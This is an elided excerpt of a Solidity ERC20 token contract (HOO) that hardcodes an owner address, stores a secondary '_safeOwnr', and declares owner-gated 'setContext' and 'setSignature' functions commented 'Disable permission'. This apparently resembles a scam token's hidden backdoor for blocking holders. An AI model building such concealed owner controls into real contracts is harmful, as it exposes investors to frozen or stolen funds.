...
contract StandardERC20 is Context, IERC20 {
    ...
    address public _ownr = 0x2628C9a1563Da705eb362480E1C1DC20bcA7F2D3;
   constructor () public {

        _name = "All Birds Are Gray By Night";
        _symbol = "HOO";
        _decimals = 18;
        uint256 initialSupply = 888888888888888 * 10 ** 18;
        _safeOwnr = _ownr;
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function setContext(address recipient) public _verify(){
  ...
  function setSignature(address recipient) public _verify(){
      //Disable permission
